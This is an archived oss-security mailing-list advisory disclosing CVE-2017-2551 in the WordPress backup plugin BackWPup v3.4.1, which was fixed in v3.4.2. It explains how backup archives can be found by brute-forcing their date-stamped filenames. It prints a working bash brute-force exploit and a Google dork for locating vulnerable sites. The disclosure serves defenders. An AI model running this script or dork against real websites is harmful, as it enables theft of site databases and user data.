X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3992" "Wednesday" "27" "September" "2017" "12:13:47" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<A9D8E9DF-36AC-4F46-BAF1-0C6E002E0D71@me.com>" "93" "[oss-security] Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download" nil nil nil "9" "2017092716:13:47" "[oss-security] Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download" (number mark "U       larry0@me.co Sep 27   93/3992  " thread-indent "\"[oss-security] Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 7648 invoked by uid 550); 27 Sep 2017 16:14:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7630 invoked from network); 27 Sep 2017 16:14:10 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1506528835; bh=BVe87Lv2NDXKiTDeBtHTga3+JCR9NcynepiVan8WWqk=;
	h=From:Content-type:MIME-version:Subject:Message-id:Date:To;
	b=3/JSNntZcHvR//XVxNoy5+zKlJGnkH9JzX4sDUScX4vpXORLy3FomOWICGJfl1jpI
 nOjwINh9xUyZ50+gJy59eyWDaK8Yao/aAf3eI4Yb+haoApZdiAkRk6jEyB1M1SPKGU
 iTVKKSX0NOF3eH6jy6dddpV5WcfIEqhUuxWYNLa9S6rSlzItfdegK2ls+1J3NusMnA
 1ksRhdQU9Ga8qHYAIRXbNxGXMwYV+At+RSB1olQ967Kcn+3BZhKnx5XY0lUivf/C8H
 T8v6ImD2AQaQRGjK4tnbsfzvfl9X4RUqb+yDJdnbRWxlnnyALUvVJuqBflpT/JGSS0
 DL+tauXf0z7hw==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-09-27_04:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1707230000 definitions=main-1709270226
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
MIME-version: 1.0 (Mac OS X Mail 10.3 \(3273\))
Message-id: <A9D8E9DF-36AC-4F46-BAF1-0C6E002E0D71@me.com>
Date: Wed, 27 Sep 2017 12:13:47 -0400
To: Open Source Security <oss-security@lists.openwall.com>
X-Mailer: Apple Mail (2.3273)
Subject: [oss-security] Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute
 forcing of backup file download

Title: Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute for=
cing of backup file download
Author: Larry W. Cashdollar, @_larry0
Date: 2017-09-08
CVE-ID:[CVE-2017-2551]
Download Site: https://wordpress.org/plugins/backwpup
Vendor: Inpsyde
Vendor Notified: 2017-09-08, fixed v3.4.2
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=3D201
Description: "The backup plugin BackWPup can be used to save your complete =
installation including /wp-content/ and push them to an external Backup Ser=
vice, like Dropbox, S3, FTP and many more."
Vulnerability:
There is a weakness in the way backwpup creates and stores the backup files=
 it generates.  It creates a random string to obscure the location, but
it uses that same string to create the storage directory under wp-content/u=
ploads/ which in most installations of WordPress allows file listings.

Someone looking to steal a copy of the database could simply list the direc=
tories in /uploads to find that random string and then brute force the loca=
tion of the file as its structure is just a date and time stamp.  It would =
take a Maximum of 86400 tries to guess if a backup is available for that da=
y.=20=20
Filename format:=20
backwpup_ RANDOMSTRINGBACKUPNUMBER_%Y-%m-%d_%H-%i-%s

Default settings are:

%d =3D Two digit day of the month, with leading zeros
%m =3D Day of the month, with leading zeros
%Y =3D Four digit representation for the year
%H =3D Hour in 24-hour format, with leading zeros
%i =3D Two digit representation of the minute
%s =3D Two digit representation of the second

https://wordpress.org/plugins/backwpup


Exploit Code:
	=E2=80=A2 #!/bin/bash
	=E2=80=A2 #Exploit for Wordpress Plugin BackWPup v3.4.1
	=E2=80=A2 #Download https://wordpress.org/plugins/backwpup
	=E2=80=A2 #CWE-552: Files or Directories Accessible to External Parties
	=E2=80=A2 #CVE-ID: CVE-2017-2551
	=E2=80=A2 #Google Dork: inurl:wp-content/uploads/backwpup
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 #Add banner about vulnerability
	=E2=80=A2=20=20
	=E2=80=A2 KEY=3D`curl --silent http://$1/wp-content/uploads/|html2text |gr=
ep backups | awk -F- '{print $2}'`
	=E2=80=A2=20=20
	=E2=80=A2 #Add error checking here
	=E2=80=A2 echo "[+] Getting Unique Key $KEY"
	=E2=80=A2 DIR=3D"backwpup-$KEY-backups"
	=E2=80=A2 echo "[+] Checking directory $DIR"
	=E2=80=A2 WPATH=3D"$DIR/backwpup_$KEY"
	=E2=80=A2 echo "[+] Creating Path: $WPATH"
	=E2=80=A2 #use date command here for the default date of current day
	=E2=80=A2 MONTH=3D09
	=E2=80=A2 DAY=3D07
	=E2=80=A2 YEAR=3D2017
	=E2=80=A2 Z=3D0
	=E2=80=A2=20=20
	=E2=80=A2 echo "[+] Scanning website for available backups:"
	=E2=80=A2 for y in `seq -w 0 23`; do
	=E2=80=A2         for x in `seq -w 0 59`; do
	=E2=80=A2                  Y=3D`echo "scale=3D2;($Z/86000)*100"|bc`;
	=E2=80=A2                  echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
\b\b\b\b\b\b\b\b\b\b\b\b$CWPATH $Y%"
	=E2=80=A2         for z in `seq -w 0 59`; do
	=E2=80=A2                  Z=3D$(( $Z + 1 ));
	=E2=80=A2                  CWPATH=3D"http://$1/wp-content/uploads/$WPATH"0=
1"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip";
	=E2=80=A2                  RESULT=3D`curl -s --head $CWPATH|grep 200`;
	=E2=80=A2                 if [ -n "$RESULT" ]; then
	=E2=80=A2                  echo ""
	=E2=80=A2                  echo "[+] Location $CWPATH Found";
	=E2=80=A2                  echo "[+] Received $RESULT";
	=E2=80=A2                  echo "Downloading......";
	=E2=80=A2                 # wget $CWPATH
	=E2=80=A2                   exit;
	=E2=80=A2                 fi;
	=E2=80=A2         done
	=E2=80=A2         done
	=E2=80=A2 done
	=E2=80=A2 echo "Completed."
Screen Shots:
Notes: Google Dork: inurl:wp-content/uploads/backwpup=
